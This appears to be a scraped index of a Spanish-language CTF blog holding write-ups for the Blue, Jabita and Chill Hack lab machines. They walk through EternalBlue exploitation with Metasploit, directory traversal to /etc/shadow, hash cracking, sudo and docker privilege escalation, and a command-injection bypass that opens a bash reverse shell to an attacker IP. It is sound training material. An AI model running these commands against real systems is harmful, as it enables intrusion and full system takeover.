443 lport =\u0026gt; 443 Cambiamos el payload\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/shell/reverse_tcp payload =\u0026gt; windows/x64/shell/reverse_tcp Y por último lo ejecutamos con run\nrun Ahora ya tenemos una reverse shell.\nFlags Las flags están en:\nC:\\flag1.txt\nC:\\Windows\\System32\\config\\flag2.txt\nC:\\Users\\Jon\\Documents\\flag3.txt\n","date":"2023-03-14","id":82,"permalink":"/writeups/tryhackme/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.","tags":["CTF","Fácil","Windows","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-14","id":83,"permalink":"/tags/eternalblue/","summary":"","tags":[],"title":"eternalblue"},{"content":"","date":"2023-03-14","id":84,"permalink":"/tags/f%C3%A1cil/","summary":"","tags":[],"title":"Fácil"},{"content":"","date":"2023-03-14","id":85,"permalink":"/tags/metasploit/","summary":"","tags":[],"title":"metasploit"},{"content":"","date":"2023-03-14","id":86,"permalink":"/tags/ms17-010/","summary":"","tags":[],"title":"ms17-010"},{"content":"","date":"2023-03-14","id":87,"permalink":"/tags/smb/","summary":"","tags":[],"title":"smb"},{"content":"","date":"2023-03-14","id":88,"permalink":"/tags/windows/","summary":"","tags":[],"title":"Windows"},{"content":"\rReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=332 ms --- 10.10.10.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 332.152/332.152/332.152/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.40 5 │ [*] Open ports: 135,139,445,49152,49153,49154,49155,49156,49157 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV 10.10.10.40-oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T17:41:08+00:00 | smb2-time: | date: 2023-03-13T17:41:09 |_ start_date: 2023-03-12T19:47:16 | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2s, deviation: 1s, median: 1s Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Intrusión El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\n❯ sudo nmap --script smb-vuln* -p139,445 -T4 -Pn 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 18:44 CET Nmap scan report for 10.10.10.40 Host is up (0.072s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND Es vulnerable. Vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Definimos ip de víctima y atacante\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOST 10.10.10.40 RHOST =\u0026gt; 10.10.10.40 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.10.14.27 lhost =\u0026gt; 10.10.14.27 Lo ejecutamos\nrun Por último para spawnear una shell\nshell Flags type \\Users\\haris\\Desktop\\user.txt type \\Users\\Administrator\\Desktop\\root.tx ","date":"2023-03-13","id":89,"permalink":"/writeups/hackthebox/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.","tags":["CTF","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-06","id":90,"permalink":"/tags/awk/","summary":"","tags":[],"title":"awk"},{"content":"","date":"2023-03-06","id":91,"permalink":"/tags/directory-traversal/","summary":"","tags":[],"title":"Directory Traversal"},{"content":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP víctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 192.168.1.141 PING 192.168.1.141 (192.168.1.141) 56(84) bytes of data. 64 bytes from 192.168.1.141: icmp_seq=1 ttl=64 time=0.257 ms --- 192.168.1.141 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.257/0.257/0.257/0.000 ms En este caso da un ttl (time to live) de 64, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.141 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 192.168.1.141 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 192.168.1.141 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 00b003d392f8a0f95a93207bf80aaada (ECDSA) |_ 256 ddb4261d0ce738c37a2f07bef8743ebc (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.52 (Ubuntu) Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Web Está corriendo una web por el puerto 80\nSegún el mensaje podemos intuir que como está en proceso de construcción no va a estar muy bien echa\nFuzzing subdirectorios Vamos a buscar subdirectorios con gobuster con el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.141 /building (Status: 301) [Size: 317] [--\u0026gt; http://192.168.1.141/building/] Nos ha encontrado un subdirectorio\nAl entrar si nos fijamos en la url vemos como hay un \u0026lsquo;?page=archivo\u0026rsquo;\nEn este caso lo que se puede probar es si es vulnerable a directory traversal\nEfectivamente, es vulnerable, viendo el /etc/passwd podemos ver 2 usuarios\njaba jack Después de ir probando varias cosas he encontrado que podemos ver el archivo /etc/shadow\nRápidamente podemos ver que el hash de jack es un sha512 porque empieza por \u0026lsquo;$6$\u0026rsquo;, Nos lo copiamos y lo guardamos en un archivo en nuestra máquina llamado hash, después con john de ripper y el diccionario rockyou.txt vamos a intentar encontrar la contraseña\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya nos podemos conectar por ssh como jack\nEscalada de privilegios Jaba Con un sudo -l vemos que podemos ejecutar awk como jaba\njack@jabita:~$ sudo -l Matching Defaults entries for jack on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jack may run the following commands on jabita: (jaba : jaba) NOPASSWD: /usr/bin/awk Haciendo una búsqueda por la web de gtfobins encontramos que con el siguiente comando podemos escalar privilegios\nsudo -u jaba /usr/bin/awk \u0026#39;BEGIN {system(\u0026#34;/bin/bash\u0026#34;)}\u0026#39; Ya podemos ver la flag en /home/jaba/user.txt\nRoot con sudo -l vemos que podemos ejecutar un archivo de python llamado clean.py\nMatching Defaults entries for jaba on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jaba may run the following commands on jabita: (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py Con un cat a /usr/bin/clean.py vemos que el progrma importa una libreria llamada wild y ejecuta la funcion first de la libreria wild\njaba@jabita:~$ cat /usr/bin/clean.py import wild wild.first() Para encontrar donde está el wild.py vamos a usar find\njaba@jabita:~$ find / -name wild.py 2\u0026gt;/dev/null /usr/lib/python3.10/wild.py Tenemos permisos de escritura\njaba@jabita:~$ ls -l /usr/lib/python3.10/wild.py -rw-r--rw- 1 root root 42 Mar 6 17:28 /usr/lib/python3.10/wild.py Vamos a modificarlo de tal forma que quede así\nimport os def first(): os.system(\u0026#34;bash\u0026#34;) Importamos la libreria os, definimos la función first y dentro de la función first ponemos que ejecute bash, como estamos ejecutando el programa como root nos va a spawnear una bash como root\njaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py root@jabita:/home/jaba# id uid=0(root) gid=0(root) groups=0(root) root@jabita:/home/jaba# Ya somos root!\nPodemos ver la flag en /root/root.txt\n","date":"2023-03-06","id":92,"permalink":"/writeups/hackmyvm/jabita/","summary":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP víctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Directory Traversal","python","awk"],"title":"Jabita"},{"content":"","date":"2023-03-06","id":93,"permalink":"/tags/linux/","summary":"","tags":[],"title":"Linux"},{"content":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.11.182 PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data. 64 bytes from 10.10.11.182: icmp_seq=1 ttl=61 time=558 ms --- 10.10.11.182 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 558.208/558.208/558.208/0.000 ms En este caso da un ttl (time to live) de 61, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.182 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.11.182 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.11.182 -oN versions Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:15 CET Nmap scan report for photobomb.htb (10.10.11.182) Host is up (0.29s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.28.215 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09f95db918d0b23a822d6e768cc20144 (RSA) | 256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA) |_ 256 3005cc52c66f6504860f7241c8a439cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Game Info |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos FTP Lo primero que nos reporta nmap es que el usuario anonymous está permitido y hay un archivo llamado note.txt.\n$ ftp 10.10.11.182 # Nos conectamos por ftp Connected to 10.10.11.182. 220 (vsFTPd 3.0.3) Name (10.10.11.182:d3b0o): anonymous # Con el usuario anonymous 331 Please specify the password. Password: # Sin contraseña 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||8911|) 150 Here comes the directory listing. -rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt # Nos lo pasamos a nuestra máquina local: note.txt remote: note.txt 229 Entering Extended Passive Mode (|||15616|) 150 Opening BINARY mode data connection for note.txt (90 bytes). 100% |*****************************************************************************| 90 28.28 KiB/s 00:00 ETA 226 Transfer complete. 90 bytes received in 00:00 (0.29 KiB/s) Contenido de el archivo note.txt\nAnurodh told me that there is some filtering on strings being put in the command \u0026ndash; Apaar\nDe esta nota podemos sacar 2 posibles usuarios\nApaar Anurodh HTTP Subdirectorios Para encontrar subdirectorios vamos a usar la herramienta gobuster con el siguiente comando\n$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.182/ /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.182/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.182/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.11.182/fonts/] /secret (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/secret/] Hay un subdirectorio que a simple vista llama la atención /secret\nAl entrar vemos que podemos ejecutar comandos.\nProbando comandos podemos ver que hay algunos que los bloquea\u0026hellip;\nIntrusión Al poner un comando válido, como por ejemplo pwd, \u0026ldquo;;\u0026rdquo; y un comando bloqueado, nos ejecuta los 2.\nDe tal forma que quedaría así: pwd;ls\nOtra opción sería poner \u0026ldquo;\\\u0026rdquo; antes del comando, porejemplo \\ls\nAhora lo que vamos a hacer es mandarnos una reverse shell desde la máquina víctima a la nuestra.\nLo primero va a ser ponerse en escucha por el puerto 443 con nc\nnc -nlvp 443 Y después vamos a mandar desde la web el siguiente comando:\n# Puerto pwd;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; # IP Atacante Recibimos la reverse shell!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.2.28.215] from (UNKNOWN) [10.10.11.182] 57032 bash: cannot set terminal process group (1022): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/secret$ Con un ip a podemos comprobar que estamos en la 10.10.11.182\nwww-data@ubuntu:/var/www/html/secret$ ip a ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9001 qdisc fq_codel state UP group default qlen 1000 link/ether 02:36:f5:10:cb:37 brd ff:ff:ff:ff:ff:ff inet 10.10.11.182/16 brd 10.10.255.255 scope global dynamic eth0 valid_lft 3363sec preferred_lft 3363sec inet6 fe80::36:f5ff:fe10:cb37/64 scope link valid_lft forever preferred_lft forever Tratamiento de la tty Antes de nada para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Apaar Con un sudo -l vemos que podemos ejecutar el archivo .helpline.sh que está en el /home/apaar/ como apaar\nwww-data@ubuntu:/var/www/html/secret$ sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh www-data@ubuntu:/var/www/html/secret$ Antes de nada vamos a ver el contenido del ese archivo\n#!/bin/bash echo echo \u0026#34;Welcome to helpdesk. Feel free to talk to anyone at any time!\u0026#34; echo read -p \u0026#34;Enter the person whom you want to talk with: \u0026#34; person read -p \u0026#34;Hello user! I am $person, Please enter your message: \u0026#34; msg $msg 2\u0026gt;/dev/null echo \u0026#34;Thank you for your precious time!\u0026#34; Es un programa muy simple, en el segundo input guarda la respuesta en una variable llamada msg y la ejecuta\u0026hellip;\nwww-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh Welcome to helpdesk. Feel free to talk to anyone at any time! Enter the person whom you want to talk with: test Hello user! I am test, Please enter your message: bash whoami apaar Para que nos salga el prompt y nos funcione el ctrl + l, etc\u0026hellip; podemos poner el siguiente comando\nscript /dev/null -c bash Anurodh mysql (rabbit hole) Para la escalada vamos a usar la herramienta https://linpeas.sh/ que es un script que automatiza el proceso de la escalada de privilegios\nPrimero nos lo pasamos a nuestra máquina\nDespués nos montamos un servidor con python por el puerto 80\nsudo python3 -m http.server 80 Desde la máquina víctima en el directorio /tmp nos pasamos el archivo.\nwget http://10.10.10.10/linpeas.sh Le damos permisos de ejecución con chmod\nchmod +x linpeas.sh Y lo ejecutamos ./linpeas.sh\nReporta que hay 2 puertos que solo son visibles desde el localhost\ntcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN Esto lo podríamos haber encontrado tambíen con:\napaar@ubuntu:/tmp$ (netstat -punta || ss --ntpu) | grep \u0026#34;127.0\u0026#34; (No info could be read for \u0026#34;-p\u0026#34;: geteuid()=1001 but you should be root.) tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - El puerto 3306 es el puerto predeterminado de mysql\nDentro del directorio /var/www/files hay un archivo llamado index.php en el cual hay unas credenciales para mysql\nLas cuales podemos usar para conectarnos\napaar@ubuntu:/var/www/files$ mysql -u root -p Enter password: mysql\u0026gt; Primero listamos las bases de datos\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | webportal | +--------------------+ 5 rows in set (0.00 sec) Después listamos las tablas de la base de datos webportal\nmysql\u0026gt; show tables from webportal; +---------------------+ | Tables_in_webportal | +---------------------+ | users | +---------------------+ 1 row in set (0.00 sec) Por último vemos el contenido de la tabla\nmysql\u0026gt; use webportal mysql\u0026gt; select * from users; +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd | | 2 | Apaar | Dahal | cullapaar | 686216240e5af30df0501e53c789a649 | +----+-----------+----------+-----------+----------------------------------+ 2 rows in set (0.00 sec) Podemos ver que está el hash de dos usuarios\nCon hash-identifier buscamos que tipo es\n$ hash-identifier 7e53614ced3640d5de23f111806cc4fd Possible Hashs: [+] MD5 Vamos a guardar cada uno en un archivo (hash1, hash2) y usando john con el diccionario rockyou vamos a intentar encontrar la contraseña\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash2 Parece que era una trampa porque no sirven para nada :)\nSteganography Dentro del directorio /var/www/files hay un archivo llamado hacker.php el cual llama la atención\nDentro del hacker.php:\n\u0026lt;img src = \u0026#34;images/hacker-with-laptop_23-2147985341.jpg\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:red;\u0026#34;\u0026gt;You have reached this far. \u0026lt;/h2\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:black;\u0026#34;\u0026gt;Look in the dark! You will find your answer\u0026lt;/h1\u0026gt; Hay un mensaje que dice: Has llegado muy lejos, Mira en la oscuridad y econtraras la respuesta\nArriba del mensaje hay una foto, la cual puede ser que tenga algo\nPara pasarla a nuestra máquina vamos a abrirnos un servidor con python desde la máquina víctima\npython3 -m http.server Y desde nuestra máquina nos la bajamos\nwget http://10.10.11.182:8000/hacker-with-laptop_23-2147985341.jpg Para ver si tiene algo oculto vamos a usar la herramienta steghide\nsteghide extract -sf hacker-with-laptop_23-2147985341.jpg La imagen contenia un backup.zip\nEl backup.zip está protegido con una contraseña, lo que vamos a hacer es sacarle el hash y después intentar romperlo con john mediante el diccionario rockyou.txt\nzip2john backup.zip \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya tenmos la contraseña y lo podemos descomprimir.\nDentro hay un php en el cual en una línea podemos ver que hay una condición con un base64\nif(base64_encode($password) == \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34;) Podemos descifrarlo con:\necho \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34; | base64 -d El resultado es la contraseña del usuario anurodh\nRoot Al hacer un id vemos que pertenecemos al grupo de docker\nanurodh@ubuntu:/var/www/files/images$ id uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker) Echando un ojo al gtfobins podemos ver que hay un comando para escalar privilegios con docker\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh Ya somos root :)\n","date":"2023-03-01","id":94,"permalink":"/writeups/tryhackme/chill-hack/","summary":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Steganography","mysql","zip2john","docker"],"title":"Chill Hack"},{"content":"","date":"2023-03-01","id":95,"permalink":"/tags/mysql/","summary":"","tags":[],"title":"mysql"},{"content":"","date":"2023-03-01","id":96,"permalink":"/tags/steganography/","summary":"","tags":[],"title":"Steganography"},{"content":"","date":"2023-03-01","id":97,"permalink":"/tags/zip2john/","summary":"","tags":[],"title":"zip2john"},{"content":"","date":"2023-02-09","id":98,"permalink":"/tags/cronjob/","summary":"","tags":[],"title":"cronjob"},{"content":"","date":"2023-02-09","id":99,"permalink":"/tags/fuzzing/","summary":"","tags":[],"title":"Fuzzing"},{"content":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.67.245 PING 10.10.67.245 (10.10.67.245) 56(84) bytes of data. 64 bytes from 10.10.67.245: icmp_seq=1 ttl=63 time=49.5 ms --- 10.10.67.245 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 49.502/49.502/49.502/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.67.245 -oG allports Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.67.245 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.67.245 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 795f116aa85c20824306cd488741b794d (RSA) | 256 af7e3aaf7eb4865883f1f6a254a69bbaad (ECDSA) |_ 256 2625ba07bdc3fb29437125dcd0698c79f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... Service Info: OSs: Unix, 